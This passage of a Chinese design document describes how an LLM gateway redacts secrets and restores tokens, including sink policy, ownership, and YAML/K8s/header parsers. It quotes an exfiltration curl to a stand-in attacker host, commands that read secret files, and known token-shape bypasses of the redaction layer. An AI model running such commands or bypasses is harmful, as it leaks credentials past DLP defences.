| 已登记 + 敏感 sink + sink 声明 `trust: "trusted"`（可信本地 broker） | restore |
| **已登记 + 敏感 sink + 未声明信任** | **block**（`restore_blocked_untrusted_sink`） |
| 未知 + protected-token-like + 敏感 sink | block（`restore_miss_blocked`） |
| 未知 + protected-token-like + 非敏感 | restore（原样透传）+ `restore_miss` |

没有这一维时，模型只要输出 `curl https://evil.example/?x=<已登记 token>`，本层就会把明文交给 shell——即把"已登记"误当成"可下发"。sink 的信任**默认拒绝**（未声明即不可信），因为猜"可信"的失败模式是外泄，猜"不可信"的失败模式只是保留 token 并留下 telemetry。

实体类别当前取 `ctx.entityClassFor?.(token)`，缺省按 `CREDENTIAL` 处理（fail-closed）：把未知实体当成不敏感会还原秘密，当成敏感最多是多留一个 token。

阻断条件是**三个条件的合取**，缺一不可：

1. token 在本请求映射中**未知**（`tokenToRaw` 查不到）
2. token 是 **protected-token-like**（`isProtectedTokenLike`）
3. sink **敏感**

`PROTECTED_TOKEN_LIKE_RE` 刻意收窄：只认本网关的 token 方言（`CRG_<id>_<id>`）与 legacy `{{Redact:<64 hex>}}`。它**不是随机性启发式**——`i-0a1b2c3d4e5f67890`、`arn:aws:iam::123456789012:role/...`、`8f14e45f-ceea-...`、`app_01J8ZK9Q2M4N7P`、`vehicle-status-service-84d499d4cb-28dt2` 全部不匹配，因此不会被误伤。

telemetry 三种：`restore_ok`（全部已登记）/ `restore_miss`（存在未知 token-like 但在非敏感 sink，原样透传并上报）/ `restore_miss_blocked`（敏感 sink 命中，阻断）。

与 `restoreText` 的分工：`restoreText` 只做映射查找，不改行为；策略层独立判定。既有语义（未知 token 原样透传）因此保持不变，策略是**附加**判定而不是替换。

## 9.3 Namespace ownership（已实现）

三分法，由 `classifyOwnership(token, ctx, registry)` 给出：

| 归属 | 判定依据 | 本层行为 |
|---|---|---|
| `OWN` | `ctx.tokenToRaw.has(token)` | restore，但受 sink policy 约束（见 9.2） |
| `FOREIGN_REGISTERED` | 已登记 namespace 命中 **且** token 形状合法 | **永不 restore、永不改写**；敏感 sink 且 sink 未声明 trusted 时 **block** |
| `UNKNOWN` | 其余 | 普通文本 preserve + telemetry；敏感 sink block |

**为什么 FOREIGN_REGISTERED 在敏感 sink 里也要 block**：外层 DLP 正是在那里把明文替换回去。放行等于把 exfiltration 路径从"本层还原"换成"外层还原"，风险不变。

**为什么 matcher 不能宽泛**：namespace 是**可信配置**，不是 payload 派生数据。若把"长得像 `CRG_*`"一律当外来可信，控制 payload 的人就能把自己的文本声明成外来从而绕过全部检测——正是 `isProtectedToken` 要堵的那个 bypass。因此：

- 前缀 namespace：matcher 命中 **且** token 形状合法（`FOREIGN_TOKEN_SHAPE_RE = /^[A-Z][A-Z0-9]*(?:_[A-Z0-9]+)+$/`）。形状里不含 `- : . 空格`，所以 `i-0a1b2c3d4e5f67890`、`arn:aws:iam::…`、UUID、release 名**即使 matcher 写成 `.*` 也claim不到**。
- 精确登记（`registerTokens`）：本身就是显式信任决定，**不再受形状约束**，用于没有可控前缀形状的 issuer。

已知覆盖缺口（显式测试记录，不当作已解决）：未登记的外来 token 若其形状不是本层方言，则既不匹配 `REDACTED_TOKEN` 也不匹配 `PROTECTED_TOKEN_LIKE_RE`，UNKNOWN 分支看不到它。真正的修法是让各 provider 规则识别常见 DLP 形状，属 D 组之后的工作。

## 9.4 测试断言的两个陷阱（迁移期实测）

1. **`isRedactedText` 是形状判定，不是"发生过敏删"的判定。** 对本身就长得像 token 的输入（如 `API_KEY=CRG_AAAAAAAA_0001`）它返回 `true`，即使一个字都没改。凡是想表达"是否被脱敏"的断言，必须比较输入与输出，不能只用这个谓词——否则会写出自指的假绿断言。
2. **`assert.match(x, 全局正则)` 不可用**，理由见 9.1。

## 9.5 Structured Context：D1 assignment family（已实现）

**解析器是证据生产者，不是脱敏器。** 它只定位 raw value span 并把字段名报上来，最终的 span merge 仍由统一流程决定。**不 unquote、不 decode、不 normalize**：span 只覆盖引号**内部**，`KEY="` 与结尾的 `"` 原样保留。否则结构化提取层自己就开始改宿主语法了。

D1 覆盖的绑定形式：`.env` 赋值、shell `export KEY=value`、带空格的 `KEY = value`。

统一记录形状（后续 D2/D3 的 adapter 只负责产出同样的 evidence，不各自 redact）：

```js
{ kind: "binding", key, normalizedKey, valueStart, valueEnd,
  syntax: "env" | "shell", evidence: [...], strength }
```

`evidence` 取值：`structured_binding`、`strong_secret_key`、`quoted_value`、`reference_value`。

**key 强弱分档**（裸 `key` 刻意留弱）：

| 档 | 例 |
|---|---|
| strong | `password` `passwd` `passphrase` `secret` `token` `credential` `api_key` `access_key` `secret_key` `private_key` `client_secret` `auth_token` `signing_key` `encryption_key` |
| weak（inert） | 裸 `key`、`*_key`、`cache_key` `partition_key` `sort_key` `map_key` `primary_key` `foreign_key` `group_key` `shard_key` `build_key` `routing_key` `dedupe_key` |

**reference value 不当作字面秘密**：`$VAR`、`${VAR}`、`{{ tpl }}`、`{var}`、`%VAR%`、`<var>` 会被标记 `reference_value` 并排除出 span —— 把模板替换成 token 会破坏宿主文件。

**fail-open 的解析语义**：解析失败或不匹配只贡献 0 个 span，**不 suppress `G`/`H`/其它 detector、不提前返回**。已用开关对照测试固定归因：`structuredContext: false` 时旧漏报复现。

分片计划：

| 片 | 范围 | 状态 |
|---|---|---|
| D1 | assignment family（`.env` / `export` / 空格赋值） | 已实现 |
| D2 | YAML scalar binding（`key: value`、`data:\n  key: value`） | 待做 |
| D3 | `Authorization`/HTTP header + URL query（`?access_token=`） | 待做 |

每片自带 positive / negative / bounds / round-trip 断言。`entityClassFor` 的分类器不混进这些片，D 结束后单独一刀。

## 9.6 D1.1 共享 evidence 层加固（已实现）

三项都是 D2 及之后的 adapter 会直接复用的层，所以在开 D2 之前先钉住。

### 9.6.1 key 语义边界

`classifyKeyStrength` 原先是 pure substring match，进入 YAML 后误删面会放大。现在：

- **归一化先切 camelCase**（`secretName` → `secret_name`、`secretKeyRef` → `secret_key_ref`、`passwordHash` → `password_hash`）。K8s 字段绝大多数是 camelCase，不切则元数据规则永不触发。
- **元数据后缀降级**：`_name _path _file _dir _uri _url _ref _reference _id _type _kind _class _label _annotation _key _keys _hash _digest _checksum _policy _profile _provider _store _source _field _var _env _length _size _format _algorithm _version _expiry _ttl _rotation _manager _backend _engine` 结尾 ⇒ `WEAK`。
- **判定是后缀式**：`password_hash` 指派生值、`secret_name` 指位置；而 `password_value`（强词在前）仍是强。
- **canonical 白名单优先**：`api_key` / `access_key` / `secret_key` / `private_key` / `signing_key` / `encryption_key` / `session_key` / `master_key` / `client_key` / `access_token` / `client_secret` … 先于元数据规则判定，否则 `api_key` 会被自己的 `_key` 后缀降级。
- **`public_key` 刻意不属于秘密**：公钥不是秘密，但同属 `*_key` 命名族，纳入只会扩大误删面。

### 9.6.2 containment-aware merge（修正 redaction bounds 漏洞）

原 merge 是「高优先级先占位、overlap 即丢弃」，存在**边界丢失**：

```
DB_PASSWORD="prefix <PAT> suffix"
             └──── binding span（整个 value）────┘
                   └── 更窄的 provider hit ──┘
```

窄 hit 因优先级胜出，包含它的 binding span 被作为 overlap 丢弃 ⇒ **只遮住 PAT，密码剩余部分继续明文暴露**。实测复现：输出 `DB_PASSWORD="prefix CRG_… suffix"`。

修法：

- 外层 span **吸收**内部更窄的 hit，**redaction bounds 由更宽的 strong binding 决定**，同时把内部 hit 的类型并入 `evidence`；
- **归因归最具体的 hit**：内部 provider 规则（`gitleaks`）继续命名该秘密（`type` = `gitleaks`，`providerType` = `binding`），否则会有 `ruleId` 被丢；
- **被吸收的 span 不得再单独 emit**：合并项继承了它的 type 与 priority，两者同时在场时窄的那个可能赢下 overlap 竞争，等于把 bug 又装回去；
- 同类型同边界的重复项不记为 absorbed（否则元数据自指）。

### 9.6.3 reference 形式

`REFERENCE_VALUE_RE` 补齐 **GitHub Actions `${{ secrets.X }}`**（贪婪匹配，否则内层 `}` 会提前终止、把 `${{` 当字面秘密）与**命令替换 `$(cmd)`**。

`$(...)` 明确按 **reference / expression** 处理，不作为字面秘密：`$(cat /run/secrets/pw)`、`$(vault kv get -field=password …)` 本身就是"不把秘密落盘"的正确做法，替换成 token 反而破坏这层间接。

另外修了一个相关缺陷：**未闭合引号**（截断日志、流式 delta 被切断）会把开引号吞进 value span，导致替换后出现 `KEY=""ABCDEFG…`。

## 9.7 D2a：简单 YAML block-mapping scalar（已实现）

范围刻意收窄，只处理：

```yaml
password: xxx
password: "xxx"
password: 'xxx'
```

**不处理**（D2b/D2c）：block scalar（`|` `>`）、sequence、flow style（`{}` `[]`）、anchor/alias/tag、multi-document、非 scalar 值。

### 结构上下文：hint，不是事实

D2a 维护 indentation stack 并产出：

```js
{ syntax: "yaml", key, valueStart, valueEnd, indent,
  pathSegments: ["data", "password"],
  pathConfidence: "simple-mapping" | "unknown" }
```

`pathConfidence` 只有两档。遇到不建模的结构时：

- **路径退化**：`pathConfidence = unknown`、`pathSegments = []`，并追加 `path_unknown` evidence；
- **但该行仍然被解析**——跳过整行会停止检查 sequence item 里的秘密，那是 fail-open。

**`pathSegments` 不得当作 schema path 使用。** D2c 必须写成对象级 recognizer：

```
apiVersion == v1  AND  kind == Secret  AND  path under root `data`   → base64 representation
apiVersion == v1  AND  kind == Secret  AND  path under root `stringData` → 普通 string token
```

仅凭 `path === data.password` 就判 base64 是错的（普通应用配置同样可以有 `data.password`）。测试 `pathSegments is a hint, not a schema path` 固定这个契约。

### 其他实现要点

- **引号只作定界符**：span 圈引号内部，`password: "` 与结尾 `"` 原样保留。
- **key 清洗**：锚点/别名/标签/引号从 key 中剥离（`- &a password: x` 的 key 必须是 `password`，否则强度判定失效、绑定静默失效）。
- **偏移以原始行为准**：先前用"去掉行尾空白后的长度"计算 `restStart` 而未计入该差值，导致每个 span 偏移 1 字符、值首字符被吞。
- **已知限制（显式测试）**：plain scalar 后的 ` # comment` 目前仍留在 raw value 内。不裁剪是有意的——裁剪属于改写宿主语法；目标是 D2b 处理。

分片状态：

| 片 | 范围 | 状态 |
|---|---|---|
| D1 | assignment family | 已实现 |
| D1.1 | 共享 evidence 层加固 | 已实现 |
| D2a | 简单 YAML scalar mapping | 已实现 |
| D2b | block scalar / 注释裁剪 | 已实现 |
| D2c | K8s Secret schema + base64 surrogate | 已实现 |
| D2c.1 | ownership hardening（shape ≠ ownership） | 已实现 |
| D2c.2 | surrogate policy convergence | 已实现 |
| D3a | 粘贴的 HTTP header | 已实现 |
| D3b | URL query raw-span | 已实现 |
| D3c | JSON `url` 字段覆盖 | 已实现 |

**structured-context D 组全部收口**（162 tests / 162 pass）。

## 9.8 D2b-1 / D2b-2（已实现）与 D2c 基线

### 9.8.1 D2b-1 plain scalar 注释边界

**更正一个此前写错的口径**：把 ` # comment` 留在 raw value 内**不是**"为了避免改写宿主语法"，恰恰相反——**那才会改坏宿主内容**：redaction 会把注释连同值一起吃掉，且 restore 无法逐字节还原。

正确规则（YAML 词法）：**只有前置 separation whitespace 的 `#` 才开始注释**。

```
password: abc#123          # `#` 属于值
password: abc123!  # note  # 注释，span 只覆盖 abc123!
```

实测：注释与其前的空白均保留，`round-trip` 逐字节一致；引号内的 `#` 不受影响。

### 9.8.2 D2b-2 block scalar

识别指示符族：`|` `|-` `|+` `>` `>-` `>+` 以及显式缩进指示符的**两种顺序**（`|2+` 与 `|+2`）。body 定位遵循 YAML 9.1.1：内容缩进由首个非空行决定，块在首个缩进更小的非空行结束。

**关键实测结论（措辞已修正）：要求不是"禁止跨行 span"，而是"replacement 必须维持 block scalar 的缩进与结构"。**

把一个多行体替换成**单个无缩进的 token** 会产生非法 YAML（PyYAML `ScannerError: while scanning a simple key`），四种形态实测全部失败。但**从首行内容开始、覆盖整个块体的 provider span 是可行的**——它替换后仍带有首行的缩进，YAML 依然合法，这也是 provider 规则（PEM 的 BEGIN..END）实际在做的事。真正会坏的是**跨越行边界却只覆盖部分块体**的 span：它会把值切成半行，缩进结构随之破坏。

所以实现上：

- 块体每一行**各自成为一个候选**（`block_scalar_body`），每行缩进留在 span 之外；
- 完整覆盖块体的 provider span 允许胜出（YAML 合法性由"首行缩进被保留"保证）；
- 弱键下不产 span，由内容检测器决定（见 9.9）。

实测验证（13 种形态，真实 PyYAML 解析 + restore 逐字节比对）：全部输出仍是合法 YAML，且 round-trip 全部一致，包含 `|`/`|-`/`|+`/`>`/`|2`/`|+2`/`|-2`、嵌套块、空行、注释、`abc#123`、同一文档两个块。

### 9.8.3 三个偏移 bug（都是"看起来对、实测错"）

写这一段代码时连续踩了三个**静默偏移**错误，全部由真 YAML 解析器和 round-trip 断言抓出，靠阅读代码是发现不了的：

1. `startOfLine(idx)` 用 `lines.slice(0, idx).reduce((n, l) => n + l.length + 1, lineStart)`，而 `lineStart` 本身已是当前行的前缀累计长度 ⇒ **每行前缀被加了两次**，所有 span 前移。改为预计算 `lineOffsets[]`。
2. 逐行候选里 `lineText.indexOf(lineBody, lineIndent)` 返回的是**行内相对偏移**，再加 `lineStartOffset` 相当于把缩进算了两遍。
3. 早期版本用"去尾空白后的长度"算 span 末尾，未计入尾部空白差值，导致 span 越过行尾、吞掉下一行开头。

### 9.8.4 D2c K8s Secret schema + base64 surrogate（已实现）

此前的缺口：D2a/D2b 会把 `Secret.data.*` 替换成普通 portable token，对 YAML 合法、对 Kubernetes 非法（API server：`illegal base64 data`）。现已修复。

**对象级判据**（不是 path 判据）：

```
apiVersion == v1  AND  kind == Secret  AND  path under ROOT `data`
```

`ConfigMap`、缺 `apiVersion`、`apiVersion: v2`、泛型 `data:`、以及**嵌套 `spec.data`** 全部不走 base64。最后一条尤其重要：注释里写了"仅根键"但最初没有实现该检查，测试 `only a v1 Secret gets the base64 surrogate` 把它抓了出来。

**surrogate ledger**（见 9.8.4a）让回程可用：`restoreText` 按**形状**识别 token，base64 编码后的 token 对它是不可见的，因此可见的 surrogate 必须在 ledger 中显式登记，且**只对本次请求铸造过的串**尝试查找——解码任意 base64 文本会带来大得多的误伤面。

设计决定（四项）：

| 决定 | 取值 | 理由 |
|---|---|---|
| surrogate 长度 | 长度无关（`base64(token)` 最短） | K8s 只校验能否解码，不校验解码后长度；避免为长度而填充 |
| sink policy | surrogate 与普通 token **同等对待** | `classifyRestore` 把 ledger 中的 surrogate 归一到 underlying token，复用现有四维判定，不引入第二套规则 |
| `entityClassFor` | 继续留空，UNKNOWN → credential 级 fail-closed | 与 B 组约定一致，分类器留到 D 之后单独一刀 |
| 恢复边界 | **只在 ledger 登记的 surrogate 上**查找 | 精确匹配整串；未登记的 base64 一律不碰 |

**结构 hint 必须随证据一起在 merge 中继承**：provider 规则常以更高优先级赢下 span 边界，若 merge 只传 `evidence` 不传 `pathSegments`，对象级 recognizer 就拿不到路径（`data.password` 的 span 归于 `gitleaks` 时不含 path）。已修复。

**等边界归并**：provider 规则与 binding 对同一秘密常产生**完全相同的边界**。containment 遍历刻意跳过等边界对，因此若不先做等边界归并，其中一方会被整体丢弃——若丢的是 binding，路径随之消失，对象级 recognizer 静默失效。

**端到端验证**（真实 minikube API server）：

```
脱敏后 data.password = Q1JHX0hDVTZDQV8wMDAx   → kubectl apply --dry-run=server: created ✅
restoreText(out) === 原文                      → 逐字节一致 ✅
username（弱键）保持原样                        → 未过度脱敏 ✅
```

#### 9.8.4b D2c.1 ownership hardening（安全回归修复）

在为"外来 token 透传"修 bug 时引入了一个**安全回归**：binding 层按**形状**跳过任何看起来像本层 token 的值，注释里还写着"资格仍由 merge 阶段的 ownership 决定"——但候选根本没到 merge 阶段，所以那句话是假的，口子是真开的。

```
DB_PASSWORD=CRG_AAAA_AAAA
```

`CRG_AAAA_AAAA` 完全可能就是一个真实的低熵密码。binding 候选被形状过滤掉，`H` 不会抓（熵不够），generic `G` 也大概率不抓 ⇒ **明文出网**。

**同一个错误有三份副本**，全部已修：

| 位置 | 错误 |
|---|---|
| `bindingSpansOf()` | 按形状过滤候选（已删除） |
| `RedactionContext.emit()` | `TOKEN_FULL_RE.test(match) ? match : tokenFor(match)`，把任意 token 形状字面量当已铸 token 直通 |
| legacy 过渡豁免 | 见下方"已知过渡缺口" |

**统一规则**：

```
OWN                 → preserve
FOREIGN_REGISTERED  → preserve
UNKNOWN token 形状  → 不享受任何豁免；strong binding / G / 其它 detector 命中即正常脱敏
```

**输入方向的 ownership 也与回程统一**：此前 `ForeignTokenRegistry` 只接在 `classifyRestore()` 上，输入 redaction 路径并未用它决定 foreign ownership——B 组测的是回程透传，不等于已支持 `input → model_visible`。现在 `RedactionContext` 接受 `foreignRegistry`，`isProtectedToken` 统一判定 own / registered-foreign；registry 的 token 与 namespace 命中也会作为候选进入 merge，由**同一个** ownership 过滤器决定去留。精确登记（`registerTokens`）本身即信任决定，不再受形状检查约束（与 `classifyOwnership` 同一规则）。

**已知过渡缺口（显式测试记录）**：legacy `{{Redact:<64 hex>}}` 形状在输入方向**仍被豁免**，因为 v1 token 没有 request-local namespace，无法对照 mapping 校验。后果是与刚修掉的 v2 口子同形的绕过：任何人写一个 `{{Redact:<64 hex>}}` 就能让该值跳过。移除条件已在 9.1 写明——删除 legacy restore 分支时一并去掉，测试 `KNOWN TRANSITIONAL GAP` 会在那时失败提醒。

#### 9.8.4a surrogate 与本层方言的交互

`CRG_` 形状的值是否透传，**只由 ownership 决定**（见 9.8.4b）。早期版本在 binding 层按形状跳过，那是安全回归，已删除。

## 9.10 D2c.2 surrogate policy convergence（已实现）

`classifyRestore()` 曾给 surrogate 留了一个**独立快捷分支**（敏感 sink + untrusted → 无条件 BLOCK）。那不是"与 underlying token 同等对待"：等 `entityClassFor` 真接进来后，被判成 `INFRA` 的实体，其普通 token 会按 entity policy 走，而 base64 surrogate 仍会被无条件阻断——两条路径漂移。

**修法**：删掉快捷分支。

- `resolveSurrogate(value, ctx)` 把可见 surrogate 解析为 underlying token；
- `classifyOwnership` 在**解析后的 token** 上判定，因此 ownership / entityClass / entity policy 全部针对实体而非其表示形式；
- surrogate 仍被显式遍历（base64 不是 CRG 形状，`REDACTED_TOKEN` 找不到它），但走**同一条** ownership × entityClass × sink × trust 判定。

回归用例含一条关键断言：把 `entityClassFor` 临时改成返回 `INFRA` 后，**surrogate 与普通 token 必须给出相同动作**——这正是"没有残留快捷分支"的证明。

## 9.11 D3 粘贴的 HTTP header 与 URL query（已实现）

### 两个层级必须分开

| 层级 | 处理 |
|---|---|
| **粘贴进 prompt 的 header 文本**（`Authorization: Bearer <secret>`） | **脱敏** |
| **网关发给 upstream 的传输头**（`filteredRequestHeaders()` 构造） | **原样转发**，上游需要真实凭据认证；该路径根本不经过文本脱敏 |

测试同时固定两侧：粘贴文本被脱敏，且传输头的 `Authorization` / `x-api-key` / provider 头**必须逐字保留**——否则一次错误的"加固"会打断所有已认证调用。

### URL：raw span，不 decode 不 re-encode

只替换 query value 的原始 span。百分号转义、`+`、参数顺序、重复参数、fragment **全部逐字节保留**；decode → 修改 → re-encode 会把这些静默规范化掉。query **名**允许 decode 后匹配（`access%5Ftoken`），**值**一律保持原样。敏感名集合：`access_token` `auth_token` `api_key` `key` `secret` `client_secret` `password` `token` `credential` `signature` `sig` `x-amz-*` `sas` `code` 等；非敏感参数（`page` `limit` `q` `sort`）不动。

### D3c：JSON `url` 字段不再被整串跳过

`shouldSkipString()` 原先对任何 `url` / `image_url` 键直接 `return true`，字符串**根本到不了 `redactText`**：

```json
{"url": "https://api.example.com/?access_token=SECRET"}   → 原样转发
```

现在只跳 `image_url`（它常承载 base64 data URL，不是文本），普通 `url` 字段照常扫描，由 URL query 解析器产出 raw span。嵌套的 `image_url.url` 也会被扫描出 query 秘密。

### 实现期修正

header 的 `valueStart` 最初用多个长度相减推算，得到**负偏移**（尾部空白差值与值长度相减顺序错误），输出出现重叠。改为**锚定值本身**（`line.lastIndexOf(secret)`）——header 的秘密就是行尾值，最后一次出现即 span。

## 9.12 Parser coverage（已实现，仅可观测）

**度量单位是 parser attempt，不是"没解析的字节数"。** 后者会让每句自然语言都成为 UNKNOWN，指标失去意义。attempt = parser 能识别、因而有义务定位的结构。

| 状态 | 含义 | 计入 UNKNOWN |
|---|---|---|
| `PARSED` | 结构被识别且完整定位 | 否 |
| `PARTIAL` | 识别到容器/绑定起点，但存在未建模部分（YAML path 退化、shell 引号形式等） | 否 |
| `FAILED` | 有足够证据触发尝试，但无法安全定位 | **是** |
| `NOT_APPLICABLE` | 根本不像该格式（普通自然语言） | 否，且**完全不记录** |

### 遥测内容（不含原文）

```js
{ parser: "yaml"|"env"|"shell"|"header"|"url",
  status: "PARSED"|"PARTIAL"|"FAILED",
  regionStart, regionEnd, bytes, jsonPath? }
```

**不记录原始内容**——只有偏移、状态、计数。测试断言 coverage 输出中不出现秘密、键名或任何片段。

### 请求级汇总

`RedactionContext.coverageSummary()` 返回 `attempted_regions` / `parsed_regions` / `partial_regions` / `failed_regions` / `attempted_bytes` / `located_bytes` / `unknown_bytes` / `byParser`。

**字节数对 region 做 union**，因此两个 parser 看同一段文本不会 double count；per-parser 计数仍分别统计（那里相加是有意义的）。测试断言 `attempted_bytes ≤ payload 长度`。

### "像某格式"的判据刻意收窄

否则指标会被散文淹没：

- header：需要**带连字符的头部名**或已知头前缀（`Error: connection refused` 不计）；
- YAML：需要**单个 token + 冒号**（`my key here: value` 不计）。

**已记录的语义边界**：`Error: connection refused` 会被 YAML parser 报为 `PARSED`，因为**它确实是合法 YAML**（`Error` 是键）。要求它不计入就等于要求 parser 谎报语法。真正承载信号的是 `unknown_bytes`——任何散文都不得进入 `FAILED`。

### 实测基线（8 份真实形态语料，1100 字节）

| corpus | bytes | att | parsed | partial | failed | attB | unkB |
|---|---:|---:|---:|---:|---:|---:|---:|
| K8s Secret 清单 | 114 | 8 | 8 | 0 | 0 | 107 | 0 |
| .env 文件 | 125 | 5 | 5 | 0 | 0 | 108 | 0 |
| Helm values | 170 | 8 | 8 | 0 | 0 | 154 | 0 |
| 粘贴 curl + header | 153 | 3 | 3 | 0 | 0 | 152 | 0 |
| 排错日志（含散文） | 250 | 3 | 3 | 0 | 0 | 142 | 0 |
| **纯散文** | 190 | **0** | 0 | 0 | 0 | **0** | 0 |
| 退化 YAML（sequence） | 98 | 5 | 2 | **3** | 0 | 94 | 0 |

UNKNOWN 占比 **0.00%**（该语料无不可定位形态），attempt 覆盖率 68.8%。纯散文 0 attempt、0 字节。

**第一刀只做可观测，不因 UNKNOWN 比例高而 block**。阈值/告警留待更多真实语料之后再定。

### 实现期修正

`unionBytes` 原以 `-1` 作哨兵，导致**从 0 开始的 region 永远不计入**，所有字节统计恒为 0；`summary()` 又把 `{regionStart,regionEnd}` 记录直接传给期望 `{start,end}` 的 `unionBytes`，过滤条件退化为 `undefined > undefined`。两处均已修，并加边界用例（重叠 / 相邻 / 乱序 / 从 0 开始）。

## 9.13 E0 + E1：entity class 语义与"只落账"的分类器

### E0 sink policy 的 entity class 语义（已修正）

`isCredentialRisk()` 的旧实现：

```
CREDENTIAL / UNKNOWN → true
PII / INFRA          → false
```

**这是个潜伏危险**：分类器一旦正确地把 email / 手机号 / 身份证 / 银行卡标成 `PII`，这些实体反而会**因为被分类正确而放行**到敏感 sink。已改为：

| class | 敏感 sink |
|---|---|
| `CREDENTIAL` | 保护 |
| `PII` | **保护**（本次修正） |
| `UNKNOWN` | 保护（fail-closed） |
| `INFRA` | 保持原有 policy —— 本刀**不借分类器顺手改**，留给 infra recognizer 那一刀 |

同时改名为 **`requiresSinkProtection()`**：该谓词从来不是只判断 credential。测试断言旧名 `isCredentialRisk` 已不存在。

### E1 分类器只落账，不改变 redaction verdict

**分类发生在 emit 时**——那时 span 的 `detector` / `ruleId` / `evidence` / `syntax` / `key` / `pathSegments` 都还在。等 `classifyRestore()` 再从 token 反推是猜。

```js
entityClassFor(token) { return this.entityLedger.get(token)?.entityClass ?? ENTITY_CLASS.UNKNOWN; }
```

落账条目：

```js
{ token, entityClass, detector, ruleId, evidence, strength, syntax, key,
  pathSegments, coverageStatus, encodingKind }
```

**第一版只做高置信度确定性映射**，不为覆盖率扩大误分类面：

| 证据 | class |
|---|---|
| `strong_secret_key` 绑定 / `http-header`（敏感头名） / provider 规则命中 / `sk-` / 私钥 | `CREDENTIAL` |
| `email` / `phone` / `identity` / `bank` detector | `PII` |
| entropy-only / 通用模糊命中 | `UNKNOWN` |
| **"看起来像资源 ID"** | **不判 `INFRA`** —— 留给 infra recognizer 正门产出 |

归因取**最具体的 detector**：`ruleId` 存在即记为 gitleaks；否则在 `type` 与 `absorbed` 中挑第一个非 `entropy`/`block_scalar` 的。这样 provider 规则赢下 span 边界时归因不会丢。

### 修正我之前的一个说法

我此前写过"实体来自 FAILED region，分类结果本身就不可信"——**这不能一概而论**：

```
parser FAILED + entropy-only                → 确实低可信
parser FAILED + 明确 GitHub PAT / PEM / 合法邮箱 → detector 本身依然很可信
```

`coverageStatus` 因此作为**独立证据维度**记录，**不参与降级确定性 detector**，也不与 class 揉成一个 confidence 数。Parser coverage 衡量的是"结构理解程度"，不是所有 detector 的可信度。测试 `a FAILED region does not downgrade a deterministic detector` 固定这条。

### 实测分类结果

```
CREDENTIAL  binding    key=DB_PASSWORD           cov=PARSED
CREDENTIAL  binding    key=API_KEY               cov=PARSED
CREDENTIAL  gitleaks   rule=github-classic-token cov=PARSED
CREDENTIAL  gitleaks   rule=private-key          key=private_key
PII         email / phone / identity / bank
UNKNOWN     entropy    （SHA-like 串）
```

另有一条值得记的实测：`cache_key: <base64>` **会**被判 `CREDENTIAL`——但归因是通用 provider 规则命中**值**，`key=null` 证明**不是 key 名给的**。这与"弱 key 名不授予 class"不矛盾：`cache_key: abc123` 完全不产生实体。测试同时固定这两点。

## 10. 未解决问题 / 待验证

1. **【P2 · 待验证】GLiNER 类 NER 组件**：本机 4 核无 GPU，长文本实测推理在几十秒量级，直接整段送模型不可接受；可行方向是只对候选 span 截取 ±100~300 字符窗口送模型。待验证项：窗口大小与 p50 / p95 延迟曲线、窗口截断对召回的影响、模型体积在 Workers 运行时的可行性（CPU / WASM 限制）。
   **硬性约束：任何 ML 组件不得对低熵、无结构上下文的候选做终裁**——`PIN=0000`、短密码、裸 hex 之类在缺少 key 名 / 容器证据时只能作为 SOFT_SIGNAL 参与排序，最终动作必须由确定性规则或 policy 给出。
2. **【待验证】** Helm / Go template 与旧 `{{ }}` 定界符的冲突需实测（3.2）。
3. **【待验证】** schema 类型受限位置（number / boolean / enum）的替换策略需要真实 API server 或 provider schema 验证，当前只有"fail-closed"这一个保守选项。
4. **【待验证】** 跨层归属的显式声明机制：网关与外层 DLP 如何协商 EXCLUSIVE / PASS_THROUGH（响应头、部署配置或共享清单），以及不一致时的检测点。
5. **【待验证】** infra golden corpus 的来源与规模：需要覆盖 AWS / K8s / Git / 追踪 ID 的真实样本集，才能把"零误删"作为 HARD 的准入条件。
6. **【覆盖率机制已建立，见 9.12】** 已实现 attempt 级 coverage（PARSED/PARTIAL/FAILED/NOT_APPLICABLE）与请求级 union 汇总，并有 8 份语料基线。仍**无实现数据**的部分：YAML 锚点/别名、shell 引号与转义、多行 `.env`——这些目前会体现为 PARTIAL 或不计入，需要更大语料才能定量。
7. **【已知缺口】** legacy `{{Redact:<64 hex>}}` 形状在输入方向仍被豁免（见 9.8.4b），移除条件随 legacy restore 分支删除。
7. **【待验证】** 流式场景下 base64 surrogate 的跨 chunk 还原，以及新 token 变长后 `SseRestorer` 的后缀保留上界取值。
8. **【待统一】测试夹具与语法的两处不一致**：`test/k8s-surrogate.test.js` 的 `surrogate length is independent of plaintext length` 使用了三段 token `CRG_7K2M9Q_E9999_T8F4N6P3`，与 6.5 的两段语法及 `token-syntax` 的 `parts.length === 2` 断言冲突，需改成两段夹具；该用例注释写"surrogate 长度泄露明文长度"，但断言与行为是"长度只跟踪 token"，若同请求内 token 定长则不泄露明文长度，注释应按断言修正。
9. **【待替换】测试内的实现占位**：`token-syntax` 的 `targetToken()`（`djb2(明文)` 派生 entity slot）与 `k8s-surrogate` 的 `base64Surrogate()`、`restore-miss` 的 `classifyRestore()` 都是形态占位；前者的派生方式正是 8.1 所禁止的 checksum oracle 形态，worker.js 实现时必须用 CSPRNG，不得复用测试里的推导。
